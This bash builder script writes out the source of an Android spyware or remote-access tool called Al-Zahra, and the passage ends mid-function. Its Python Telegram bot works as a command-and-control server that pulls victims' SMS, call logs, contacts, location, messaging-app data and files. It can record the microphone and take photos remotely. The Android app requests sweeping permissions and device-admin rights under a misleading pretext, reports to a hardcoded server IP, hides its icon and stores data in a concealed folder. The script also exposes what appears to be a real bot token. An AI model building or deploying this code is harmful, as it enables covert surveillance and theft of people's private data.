#!/bin/bash

# ═══════════════════════════════════════════════════════════════
# Al-Zahra Sync Engine v2.0 - Complete Project Builder
# يُنفّذ من Termux فقط
# ═══════════════════════════════════════════════════════════════

PROJECT_DIR="$HOME/alzahra-sync-engine"
SERVER_IP="216.128.156.226"

echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║     🤖 Al-Zahra Sync Engine - بناء المشروع الكامل          ║"
echo "╚═══════════════════════════════════════════════════════════════╝"

# ═══════════════════════════════════════════
# [1] تثبيت المتطلبات
# ═══════════════════════════════════════════
echo ""
echo "═══════════════════════════════════════"
echo "[1/5] تثبيت المتطلبات"
echo "═══════════════════════════════════════"

pkg update -y
pkg install -y git python gradle

echo "✅ تم تثبيت المتطلبات"

# ═══════════════════════════════════════════
# [2] إنشاء هيكل المشروع
# ═══════════════════════════════════════════
echo ""
echo "═══════════════════════════════════════"
echo "[2/5] إنشاء هيكل المشروع"
echo "═══════════════════════════════════════"

rm -rf "$PROJECT_DIR"
mkdir -p "$PROJECT_DIR"

# هيكل المجلدات
mkdir -p server
mkdir -p app/src/main/java/com/alzahra
mkdir -p app/src/main/java/com/alzahra/bot
mkdir -p app/src/main/java/com/alzahra/collector
mkdir -p app/src/main/java/com/alzahra/data
mkdir -p app/src/main/java/com/alzahra/receiver
mkdir -p app/src/main/java/com/alzahra/service
mkdir -p app/src/main/res/layout
mkdir -p app/src/main/res/values
mkdir -p app/src/main/res/xml
mkdir -p app/src/main/res/mipmap-anydpi-v26
mkdir -p app/src/main/res/drawable
mkdir -p gradle/wrapper
mkdir -p .github/workflows

echo "✅ تم إنشاء الهيكل"

# ═══════════════════════════════════════════
# [3] إنشاء ملفات السيرفر
# ═══════════════════════════════════════════
echo ""
echo "═══════════════════════════════════════"
echo "[3/5] إنشاء ملفات السيرفر"
echo "═══════════════════════════════════════"

# server/bot.py
cat > server/bot.py << 'BOTPYEOF'
#!/usr/bin/env python3
"""Al-Zahra Bot v9.0 - Complete Response System"""
import asyncio, json, logging, os, random, time
from datetime import datetime
from aiohttp import web

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler('/var/log/alzahra_bot.log'), logging.StreamHandler()])
logger = logging.getLogger('AlZahra')

BOT_TOKEN = "8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As"
OWNER_CHAT_ID = "7344776596"
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
PORT = 8443
UPLOAD_DIR = "/opt/alzahra/uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

class DataStore:
    def __init__(self):
        self.devices = {}
        self.commands = {}
        self.codes = {}
        self.last_update_id = 0
        self.pending_commands = {}

store = DataStore()

CMD_NAMES = {
    "sms": "📨 سحب SMS", "calls": "📞 سجل المكالمات", "contacts": "📇 جهات الاتصال",
    "notifications": "🔔 الإشعارات", "location": "📍 الموقع", "camera": "📷 الكاميرا",
    "whatsapp": "💬 واتساب", "messenger": "📩 ماسنجر", "instagram": "📸 انستقرام",
    "twitter": "🐦 تويتر", "snapchat": "👻 سناب شات", "tiktok": "🎵 تيك توك",
    "telegram": "✈️ تيليجرام", "viber": "📞 فايبر", "line": "💬 لاين",
    "app_data": "📱 بيانات التطبيقات", "installed_apps": "📲 التطبيقات المثبتة",
    "photos": "🖼️ الصور", "videos": "🎬 الفيديوهات", "audio": "🎵 الملفات الصوتية",
    "documents": "📄 المستندات", "downloads": "⬇️ التحميلات",
    "all": "📦 سحب الكل", "all_zip": "🗜️ سحب ZIP",
    "hide": "🔒 إخفاء", "unhide": "🔓 إظهار",
    "lock": "🔐 قفل الشاشة", "unlock": "🔓 فتح الشاشة",
    "restart": "🔄 إعادة تشغيل", "shutdown": "⏻ إيقاف",
    "record_on": "🎙️ تفعيل التسجيل", "record_off": "⏹️ إيقاف التسجيل",
    "record_mic": "🎤 تسجيل الميكروفون", "take_photo_front": "🤳 صورة أمامية",
    "take_photo_back": "📷 صورة خلفية", "screenshot": "📸 لقطة شاشة",
    "wifi_on": "📶 تفعيل WiFi", "wifi_off": "📴 إيقاف WiFi",
    "bluetooth_on": "🔵 تفعيل بلوتوث", "bluetooth_off": "⚫ إيقاف بلوتوث",
    "data_on": "📱 تفعيل البيانات", "data_off": "📵 إيقاف البيانات",
    "device_info": "📱 معلومات الجهاز", "battery_info": "🔋 البطارية",
}

async def api_call(method, params=None):
    import aiohttp
    try:
        async with aiohttp.ClientSession() as s:
            if params:
                async with s.post(f"{API}/{method}", data=params) as r: return await r.json()
            else:
                async with s.get(f"{API}/{method}") as r: return await r.json()
    except Exception as e:
        logger.error(f"API Error: {e}")
        return None

async def send_msg(chat_id, text, keyboard=None):
    params = {"chat_id": str(chat_id), "text": text, "parse_mode": "Markdown"}
    if keyboard: params["reply_markup"] = json.dumps(keyboard)
    return await api_call("sendMessage", params)

async def edit_msg(chat_id, msg_id, text, keyboard=None):
    params = {"chat_id": str(chat_id), "message_id": msg_id, "text": text, "parse_mode": "Markdown"}
    if keyboard: params["reply_markup"] = json.dumps(keyboard)
    return await api_call("editMessageText", params)

async def answer_cb(query_id, text=None):
    params = {"callback_query_id": query_id}
    if text: params["text"] = text; params["show_alert"] = True
    return await api_call("answerCallbackQuery", params)

async def send_file(chat_id, file_path, caption=""):
    import aiohttp
    try:
        async with aiohttp.ClientSession() as s:
            data = aiohttp.FormData()
            data.add_field("chat_id", str(chat_id))
            data.add_field("caption", caption)
            data.add_field("parse_mode", "Markdown")
            data.add_field("document", open(file_path, "rb"))
            async with s.post(f"{API}/sendDocument", data=data) as r: return await r.json()
    except Exception as e:
        logger.error(f"Send file error: {e}")
        return None

def main_kb():
    return {"inline_keyboard": [
        [{"text": "📱 الأجهزة", "callback_data": "devices"}],
        [{"text": "🔗 ربط جهاز", "callback_data": "link"}],
        [{"text": "📊 الحالة", "callback_data": "status"}, {"text": "⚙️ الإعدادات", "callback_data": "settings"}]
    ]}

def devices_kb():
    if not store.devices:
        return {"inline_keyboard": [[{"text": "🔄", "callback_data": "devices"}], [{"text": "🔙", "callback_data": "back"}]]}
    btns = []
    for did, info in store.devices.items():
        s = "🟢" if info.get("online") else "🔴"
        m = info.get("model", "?")
        btns.append([{"text": f"{s} {m}", "callback_data": f"dev_{did}"}])
    btns.append([{"text": "🔄", "callback_data": "devices"}])
    btns.append([{"text": "🔙", "callback_data": "back"}])
    return {"inline_keyboard": btns}

def device_kb(did):
    return {"inline_keyboard": [
        [{"text": "📨 SMS", "callback_data": f"c_{did}_sms"}, {"text": "📞 مكالمات", "callback_data": f"c_{did}_calls"}],
        [{"text": "📇 جهات", "callback_data": f"c_{did}_contacts"}, {"text": "🔔 إشعارات", "callback_data": f"c_{did}_notifications"}],
        [{"text": "📍 موقع", "callback_data": f"c_{did}_location"}, {"text": "📷 كاميرا", "callback_data": f"c_{did}_camera"}],
        [{"text": "💬 واتساب", "callback_data": f"c_{did}_whatsapp"}, {"text": "📩 ماسنجر", "callback_data": f"c_{did}_messenger"}],
        [{"text": "📱 تطبيقات", "callback_data": f"c_{did}_app_data"}, {"text": "🖼️ صور", "callback_data": f"c_{did}_photos"}],
        [{"text": "🎬 فيديو", "callback_data": f"c_{did}_videos"}, {"text": "🎵 صوت", "callback_data": f"c_{did}_audio"}],
        [{"text": "📄 مستندات", "callback_data": f"c_{did}_documents"}, {"text": "⬇️ تحميلات", "callback_data": f"c_{did}_downloads"}],
        [{"text": "📦 الكل", "callback_data": f"c_{did}_all"}, {"text": "🗜️ ZIP", "callback_data": f"c_{did}_all_zip"}],
        [{"text": "🔙", "callback_data": "devices"}]
    ]}

def settings_kb():
    return {"inline_keyboard": [
        [{"text": "🔒 إخفاء", "callback_data": "set_hide"}, {"text": "🔓 إظهار", "callback_data": "set_unhide"}],
        [{"text": "🔐 قفل", "callback_data": "set_lock"}, {"text": "🔓 فتح", "callback_data": "set_unlock"}],
        [{"text": "🎙️ تسجيل", "callback_data": "set_rec_on"}, {"text": "⏹️ إيقاف", "callback_data": "set_rec_off"}],
        [{"text": "📶 WiFi", "callback_data": "set_wifi"}, {"text": "🔵 بلوتوث", "callback_data": "set_bt"}],
        [{"text": "🗑️ مسح", "callback_data": "set_clear"}, {"text": "🔄 إعادة", "callback_data": "set_restart"}],
        [{"text": "🔙", "callback_data": "back"}]
    ]}

async def on_message(msg):
    cid = msg.get("chat", {}).get("id")
    txt = msg.get("text", "")
    if str(cid) != OWNER_CHAT_ID:
        await send_msg(cid, "⛔ غير مصرح")
        return
    if txt in ("/start", "/help"):
        await send_msg(cid, f"🎛️ *Al-Zahra v9.0*\n📱 أجهزة: {len(store.devices)}\n⏰ {datetime.now().strftime('%H:%M:%S')}", main_kb())
    elif txt == "/link":
        code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
        while code in store.codes: code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
        store.codes[code] = {"chat_id": cid, "device_id": None}
        await send_msg(cid, f"🔗 *كود الربط*\n\n`{code}`\n\n📱 أدخله في التطبيق")
    elif txt == "/devices": await show_devices(cid)
    elif txt == "/status": await show_status(cid)
    else: await send_msg(cid, "❓ /start", main_kb())

async def on_callback(cb):
    cid = cb.get("message", {}).get("chat", {}).get("id")
    mid = cb.get("message", {}).get("message_id")
    data = cb.get("data", "")
    qid = cb.get("id")
    if str(cid) != OWNER_CHAT_ID: await answer_cb(qid, "⛔"); return
    if data == "back":
        await edit_msg(cid, mid, f"🎛️ *Al-Zahra v9.0*\n📱 أجهزة: {len(store.devices)}\n⏰ {datetime.now().strftime('%H:%M:%S')}", main_kb())
        return
    if data == "devices": await show_devices(cid, mid); return
    if data == "link":
        code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
        while code in store.codes: code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
        store.codes[code] = {"chat_id": cid, "device_id": None}
        await edit_msg(cid, mid, f"🔗 *كود الربط*\n\n`{code}`\n\n📱 أدخله في التطبيق",
            {"inline_keyboard": [[{"text": "🔙", "callback_data": "back"}]]})
        return
    if data == "status": await show_status(cid, mid); return
    if data == "settings": await edit_msg(cid, mid, "⚙️ *الإعدادات*", settings_kb()); return
    if data.startswith("set_"):
        action = data[4:]; await do_setting(cid, mid, action, qid); return
    if data.startswith("dev_"): did = data[4:]; await show_device(cid, mid, did); return
    if data.startswith("c_"):
        parts = data.split("_", 2)
        if len(parts) >= 3: did, action = parts[1], parts[2]; await do_command(cid, mid, did, action, qid)
        return
    await answer_cb(qid, "❓")

async def do_command(cid, mid, did, action, qid):
    if did not in store.devices: await answer_cb(qid, "❌ الجهاز غير موجود"); return
    device = store.devices[did]; device_name = device.get("model", "?")
    if not device.get("online"):
        await answer_cb(qid, "📴 الجهاز غير متصل")
        await send_msg(cid, f"❌ *فشل*\n📱 {device_name}\n📋 {CMD_NAMES.get(action, action)}\n📴 الجهاز غير متصل")
        return
    if did not in store.commands: store.commands[did] = []
    store.commands[did].append(action)
    cmd_key = f"{did}_{action}_{int(time.time())}"
    store.pending_commands[cmd_key] = {"device_id": did, "action": action, "chat_id": cid, "msg_id": mid, "time": time.time(), "status": "pending"}
    await answer_cb(qid, f"📤 تم إرسال: {CMD_NAMES.get(action, action)}")
    text = f"📤 *تم إرسال الأمر*\n\n📱 {device_name}\n📋 {CMD_NAMES.get(action, action)}\n⏰ {datetime.now().strftime('%H:%M:%S')}\n📊 ⏳ في انتظار رد الجهاز..."
    msg = await send_msg(cid, text)
    if msg and msg.get("ok"): store.pending_commands[cmd_key]["response_msg_id"] = msg["result"]["message_id"]

async def handle_response(data):
    device_id = data.get("device_id"); action = data.get("type")
    success = data.get("success", False); message = data.get("message", "")
    for cmd_key, cmd in list(store.pending_commands.items()):
        if cmd["device_id"] == device_id and cmd["action"] == action:
            chat_id = cmd["chat_id"]; msg_id = cmd.get("response_msg_id", cmd["msg_id"])
            device = store.devices.get(device_id, {}); device_name = device.get("model", "?")
            if success:
                text = f"✅ *تم التنفيذ بنجاح*\n\n📱 {device_name}\n📋 {CMD_NAMES.get(action, action)}\n⏰ {datetime.now().strftime('%H:%M:%S')}\n📊 ✅ نجاح\n\n📝 الرد:\n{message}"
            else:
                text = f"❌ *فشل التنفيذ*\n\n📱 {device_name}\n📋 {CMD_NAMES.get(action, action)}\n⏰ {datetime.now().strftime('%H:%M:%S')}\n📊 ❌ فشل\n\n📝 السبب:\n{message}"
            await edit_msg(chat_id, msg_id, text)
            del store.pending_commands[cmd_key]; break

async def do_setting(cid, mid, action, qid):
    settings_msg = {
        "hide": "🔒 تم إرسال أمر الإخفاء", "unhide": "🔓 تم إرسال أمر الإظهار",
        "lock": "🔐 تم إرسال أمر القفل", "unlock": "🔓 تم إرسال أمر الفتح",
        "rec_on": "🎙️ تم تفعيل التسجيل", "rec_off": "⏹️ تم إيقاف التسجيل",
        "wifi": "📶 تم تبديل WiFi", "bt": "🔵 تم تبديل البلوتوث",
        "clear": "🗑️ تم مسح البيانات", "restart": "🔄 تم إرسال إعادة التشغيل"
    }
    await answer_cb(qid, settings_msg.get(action, "✅ تم التنفيذ"))
    await send_msg(cid, f"⚙️ *الإعدادات*\n\n{settings_msg.get(action, '✅ تم التنفيذ')}")

async def show_devices(cid, mid=None):
    if not store.devices: t = "📱 *الأجهزة*\n\n❌ لا توجد"
    else:
        t = f"📱 *الأجهزة ({len(store.devices)})*\n\n"
        for did, i in store.devices.items():
            s = "🟢" if i.get("online") else "🔴"
            t += f"{s} {i.get('model', '?')} | {i.get('android', '?')}\n"
    if mid: await edit_msg(cid, mid, t, devices_kb())
    else: await send_msg(cid, t, devices_kb())

async def show_device(cid, mid, did):
    if did not in store.devices: await edit_msg(cid, mid, "❌ الجهاز غير موجود"); return
    i = store.devices[did]
    t = f"📱 *{i.get('model', '?')}*\n\n🤖 Android {i.get('android', '?')}\n{'🟢' if i.get('online') else '🔴'} {'✅' if i.get('linked') else '⏳'}\n⏰ {i.get('last_seen', '?')}"
    await edit_msg(cid, mid, t, device_kb(did))

async def show_status(cid, mid=None):
    try:
        import psutil
        c, m, d = psutil.cpu_percent(), psutil.virtual_memory().percent, psutil.disk_usage('/').percent
    except: c = m = d = 0
    conn = sum(1 for dev in store.devices.values() if dev.get("online"))
    total = len(store.devices)
    t = f"📊 *الحالة*\n💻 CPU: {c}%\n🧠 RAM: {m}%\n💾 Disk: {d}%\n📱 أجهزة: {conn}/{total}\n⏰ {datetime.now().strftime('%H:%M:%S')}"
    kb = {"inline_keyboard": [[{"text": "🔙", "callback_data": "back"}]]}
    if mid: await edit_msg(cid, mid, t, kb)
    else: await send_msg(cid, t, kb)

async def poll():
    while True:
        try:
            r = await api_call("getUpdates", {"offset": store.last_update_id + 1, "limit": 10, "timeout": 30})
            if r and r.get("ok"):
                for u in r.get("result", []):
                    store.last_update_id = u["update_id"]
                    if "message" in u: await on_message(u["message"])
                    elif "callback_query" in u: await on_callback(u["callback_query"])
            await asyncio.sleep(1)
        except Exception as e:
            logger.error(f"Poll error: {e}"); await asyncio.sleep(5)

async def verify(request):
    try:
        d = await request.json(); code = d.get("code"); did = d.get("device_id")
        model = d.get("model", "?"); android = d.get("android", "?")
        if code not in store.codes: return web.json_response({"status": "error", "message": "كود غير صحيح"})
        ci = store.codes[code]; ci["device_id"] = did
        store.devices[did] = {"model": model, "android": android, "online": True,
            "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "linked": True, "owner": ci["chat_id"]}
        await send_msg(ci["chat_id"], f"✅ *تم ربط جهاز!*\n📱 {model}\n🤖 Android {android}")
        return web.json_response({"status": "ok", "device_id": did})
    except Exception as e: return web.json_response({"status": "error", "message": str(e)})

async def register(request):
    try:
        d = await request.json(); did = d.get("device_id")
        if did in store.devices:
            store.devices[did]["online"] = True
            store.devices[did]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        else:
            store.devices[did] = {"model": d.get("model", "?"), "android": d.get("android", "?"),
                "online": True, "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "linked": False}
        return web.json_response({"status": "ok"})
    except: return web.json_response({"status": "error"})

async def data(request):
    try:
        reader = await request.multipart(); did = dtype = None; path = None
        while True:
            part = await reader.next()
            if part is None: break
            if part.name == "device_id": did = await part.text()
            elif part.name == "type": dtype = await part.text()
            elif part.name == "file":
                fn = f"{did}_{dtype}_{int(time.time())}_{part.filename}"
                path = os.path.join(UPLOAD_DIR, fn)
                with open(path, "wb") as f:
                    while True:
                        chunk = await part.read_chunk()
                        if not chunk: break
                        f.write(chunk)
        if did and dtype:
            if did in store.devices and store.devices[did].get("linked"):
                owner = store.devices[did].get("owner")
                if owner:
                    await send_msg(owner, f"📥 *بيانات جديدة!*\n📱 {store.devices[did].get('model', '?')}\n📁 {dtype}")
                    if path and os.path.exists(path): await send_file(owner, path, f"📱 {dtype}")
            return web.json_response({"status": "ok"})
        return web.json_response({"status": "error"})
    except Exception as e: return web.json_response({"status": "error"})

async def response(request):
    try: d = await request.json(); await handle_response(d); return web.json_response({"status": "ok"})
    except Exception as e: return web.json_response({"status": "error"})

async def commands(request):
    try:
        did = request.query.get("device_id", ""); cmds = store.commands.get(did, []); store.commands[did] = []
        return web.json_response({"commands": cmds})
    except: return web.json_response({"commands": []})

async def status(request):
    try:
        d = await request.json(); did = d.get("device_id")
        if did in store.devices:
            store.devices[did]["online"] = True
            store.devices[did]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        return web.json_response({"status": "ok"})
    except: return web.json_response({"status": "error"})

async def main():
    logger.info("=" * 60); logger.info("  Al-Zahra Bot v9.0 - Complete System"); logger.info("=" * 60)
    app = web.Application()
    app.router.add_post("/api/verify_code", verify); app.router.add_post("/api/register", register)
    app.router.add_post("/api/data", data); app.router.add_post("/api/response", response)
    app.router.add_get("/api/commands", commands); app.router.add_post("/api/status", status)
    runner = web.AppRunner(app); await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT); await site.start()
    logger.info(f"Server on port {PORT}"); await poll()

if __name__ == "__main__": asyncio.run(main())
BOTPYEOF

# server/requirements.txt
cat > server/requirements.txt << 'REQSEOF'
aiohttp>=3.9.0
psutil>=5.9.0
REQSEOF

# server/setup.sh
cat > server/setup.sh << 'SETUPEOF'
#!/bin/bash
echo "=========================================="
echo "  تثبيت Al-Zahra Bot على السيرفر"
echo "=========================================="
apt update && apt upgrade -y
apt install -y python3 python3-pip python3-venv git nginx
mkdir -p /opt/alzahra
cd /opt/alzahra
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
cat > /etc/systemd/system/alzahra.service << 'SERVICEEOF'
[Unit]
Description=Al-Zahra Bot
After=network.target
[Service]
Type=simple
User=root
WorkingDirectory=/opt/alzahra
ExecStart=/opt/alzahra/venv/bin/python bot.py
Restart=always
RestartSec=5
[Install]
WantedBy=multi-user.target
SERVICEEOF
systemctl daemon-reload; systemctl enable alzahra; systemctl start alzahra
echo "✅ تم تثبيت البوت بنجاح!"
SETUPEOF

chmod +x server/setup.sh

echo "✅ تم إنشاء ملفات السيرفر"

# ═══════════════════════════════════════════
# [4] إنشاء ملفات التطبيق المعدلة
# ═══════════════════════════════════════════
echo ""
echo "═══════════════════════════════════════"
echo "[4/5] إنشاء ملفات التطبيق المعدلة"
echo "═══════════════════════════════════════"

# app/src/main/java/com/alzahra/MainActivity.java
cat > app/src/main/java/com/alzahra/MainActivity.java << 'MAINJAVA'
package com.alzahra;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.alzahra.receiver.AdminReceiver;
import com.alzahra.service.CoreService;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {
    private static final String TAG = "AlZahra";
    private static final int PERM_REQ = 1001;
    private SharedPreferences prefs;
    private Handler handler;
    private LinearLayout layout;
    private TextView statusText;
    private ProgressBar progressBar;
    private String serverUrl = "http://216.128.156.226:8443";
    private int currentStep = 0;
    private static final int TOTAL_STEPS = 10;

    private final String[][] PERMISSIONS = {
        {Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_CALL_LOG, Manifest.permission.CALL_PHONE, Manifest.permission.PROCESS_OUTGOING_CALLS},
        {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS},
        {Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION},
        {Manifest.permission.CAMERA},
        {Manifest.permission.RECORD_AUDIO},
        {Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS},
        {Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}
    };

    private final String[] STEP_TITLES = {
        "صلاحيات الهاتف والمكالمات", "صلاحيات الرسائل", "صلاحيات الموقع",
        "صلاحيات الكاميرا", "صلاحيات الميكروفون", "صلاحيات جهات الاتصال", "صلاحيات التخزين"
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        prefs = getSharedPreferences("alzahra_prefs", MODE_PRIVATE);
        handler = new Handler(Looper.getMainLooper());
        if (prefs.getBoolean("configured", false)) { startServiceAndHide(); return; }
        setupUI();
        handler.postDelayed(this::processNextStep, 1000);
    }

    private void setupUI() {
        layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(50, 50, 50, 50);
        layout.setBackgroundColor(0xFF1B5E20);
        TextView title = new TextView(this);
        title.setText("🔐 إعداد التطبيق");
        title.setTextColor(0xFFFFFFFF);
        title.setTextSize(26);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 20);
        layout.addView(title);
        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progressBar.setMax(TOTAL_STEPS);
        LinearLayout.LayoutParams pbParams = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 20);
        pbParams.setMargins(0, 10, 0, 20);
        layout.addView(progressBar, pbParams);
        statusText = new TextView(this);
        statusText.setTextColor(0xFFFFFFFF);
        statusText.setTextSize(18);
        statusText.setGravity(Gravity.CENTER);
        statusText.setPadding(0, 20, 0, 20);
        layout.addView(statusText);
        setContentView(layout);
    }

    private void updateStatus(String text) {
        runOnUiThread(() -> { statusText.setText(text); progressBar.setProgress(currentStep); });
    }

    private void processNextStep() {
        if (currentStep < PERMISSIONS.length) { requestPermissionStep(currentStep); }
        else if (currentStep == PERMISSIONS.length) { requestSpecialPermissions(); }
        else if (currentStep == PERMISSIONS.length + 1) { requestAdminPermission(); }
        else if (currentStep == PERMISSIONS.length + 2) { showLinkScreen(); }
        else { finishSetup(); }
    }

    private void requestPermissionStep(int step) {
        String[] perms = PERMISSIONS[step];
        boolean allGranted = true;
        for (String perm : perms) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) { allGranted = false; break; }
        }
        if (allGranted) { currentStep++; processNextStep(); return; }
        updateStatus(String.format("الخطوة %d/%d\n\n%s", step + 1, TOTAL_STEPS, STEP_TITLES[step]));
        new AlertDialog.Builder(this).setTitle("🔐 " + STEP_TITLES[step]).setMessage("يرجى السماح للمتابعة")
            .setPositiveButton("السماح", (d, w) -> ActivityCompat.requestPermissions(this, perms, PERM_REQ + step))
            .setCancelable(false).show();
    }

    private void requestSpecialPermissions() {
        updateStatus("الخطوة 8/10\n\nصلاحيات خاصة");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            new AlertDialog.Builder(this).setTitle("🔐 التخزين الكامل").setMessage("مطلوبة للوصول لجميع الملفات")
                .setPositiveButton("السماح", (d, w) -> {
                    try { startActivityForResult(new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName())), 2001); }
                    catch (Exception e) { startActivityForResult(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName())), 2001); }
                }).setCancelable(false).show();
            return;
        }
        currentStep++; processNextStep();
    }

    private void requestAdminPermission() {
        updateStatus("الخطوة 9/10\n\nصلاحية المسؤول");
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, AdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(admin)) { currentStep++; processNextStep(); return; }
        new AlertDialog.Builder(this).setTitle("🔐 صلاحية المسؤول").setMessage("مطلوبة لحماية التطبيق")
            .setPositiveButton("السماح", (d, w) -> {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                startActivityForResult(intent, 2005);
            }).setCancelable(false).show();
    }

    private void showLinkScreen() {
        runOnUiThread(() -> {
            layout.removeAllViews();
            TextView title = new TextView(this);
            title.setText("🔗 ربط الجهاز");
            title.setTextColor(0xFFFFFFFF);
            title.setTextSize(24);
            title.setGravity(Gravity.CENTER);
            title.setPadding(0, 0, 0, 20);
            layout.addView(title);
            TextView info = new TextView(this);
            info.setText("1. افتح البوت\n2. أرسل /link\n3. أدخل الكود");
            info.setTextColor(0xFFBBBBBB);
            info.setTextSize(16);
            info.setGravity(Gravity.CENTER);
            info.setPadding(0, 0, 0, 30);
            layout.addView(info);
            EditText input = new EditText(this);
            input.setHint("أدخل الكود هنا");
            input.setTextSize(22);
            input.setGravity(Gravity.CENTER);
            input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
            input.setId(100);
            layout.addView(input);
            TextView status = new TextView(this);
            status.setText("");
            status.setTextSize(14);
            status.setGravity(Gravity.CENTER);
            status.setPadding(0, 15, 0, 15);
            status.setId(101);
            layout.addView(status);
            Button btn = new Button(this);
            btn.setText("🔗 ربط");
            btn.setTextSize(18);
            btn.setOnClickListener(v -> {
                String code = input.getText().toString().trim();
                if (code.length() != 9) { status.setText("❌ الكود 9 أرقام"); status.setTextColor(0xFFFF5252); return; }
                btn.setEnabled(false);
                status.setText("⏳ جاري التحقق...");
                status.setTextColor(0xFFFFAB40);
                verifyCode(code, status, btn);
            });
            layout.addView(btn);
        });
    }

    private void verifyCode(String code, TextView status, Button btn) {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl + "/api/verify_code");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                String deviceId = getAlzahraDeviceId();
                String json = String.format("{\"code\":\"%s\",\"device_id\":\"%s\",\"model\":\"%s\",\"android\":\"%s\"}", code, deviceId, Build.MODEL, Build.VERSION.RELEASE);
                conn.getOutputStream().write(json.getBytes());
                if (conn.getResponseCode() == 200) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) sb.append(line);
                    reader.close();
                    org.json.JSONObject resp = new org.json.JSONObject(sb.toString());
                    if ("ok".equals(resp.optString("status"))) {
                        prefs.edit().putBoolean("linked", true).putString("device_id", deviceId).apply();
                        runOnUiThread(() -> { status.setText("✅ تم الربط!"); status.setTextColor(0xFF69F0AE); showHideDialog(); });
                    } else {
                        runOnUiThread(() -> { status.setText("❌ " + resp.optString("message")); status.setTextColor(0xFFFF5252); btn.setEnabled(true); });
                    }
                } else {
                    runOnUiThread(() -> { status.setText("❌ خطأ في السيرفر"); status.setTextColor(0xFFFF5252); btn.setEnabled(true); });
                }
                conn.disconnect();
            } catch (Exception e) {
                runOnUiThread(() -> { status.setText("❌ فشل الاتصال: " + e.getMessage()); status.setTextColor(0xFFFF5252); btn.setEnabled(true); });
            }
        }).start();
    }

    private void showHideDialog() {
        new AlertDialog.Builder(this).setTitle("✅ تم الربط بنجاح!").setMessage("هل تريد إخفاء التطبيق?")
            .setPositiveButton("نعم، إخفاء", (d, w) -> { hideAppIcon(); currentStep++; processNextStep(); })
            .setNegativeButton("لا", (d, w) -> { currentStep++; processNextStep(); })
            .setCancelable(false).show();
    }

    private void hideAppIcon() {
        try {
            getPackageManager().setComponentEnabledSetting(new ComponentName(this, "com.alzahra.MainActivity"), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        } catch (Exception e) { Log.e(TAG, "Hide error", e); }
    }

    private void finishSetup() {
        updateStatus("✅ تم الإعداد بنجاح!");
        prefs.edit().putBoolean("configured", true).putLong("setup_time", System.currentTimeMillis()).apply();
        createSecretFolder();
        handler.postDelayed(this::startServiceAndHide, 1000);
    }

    private void createSecretFolder() {
        try {
            File dir = new File(getExternalFilesDir(null), ".sys_cache");
            if (!dir.exists()) dir.mkdirs();
            String[] subs = {"sms","calls","notifications","whatsapp","messenger","recordings","contacts","location","camera","temp","backups"};
            for (String s : subs) { File sub = new File(dir, s); if (!sub.exists()) sub.mkdirs(); }
            prefs.edit().putString("secret_path", dir.getAbsolutePath()).apply();
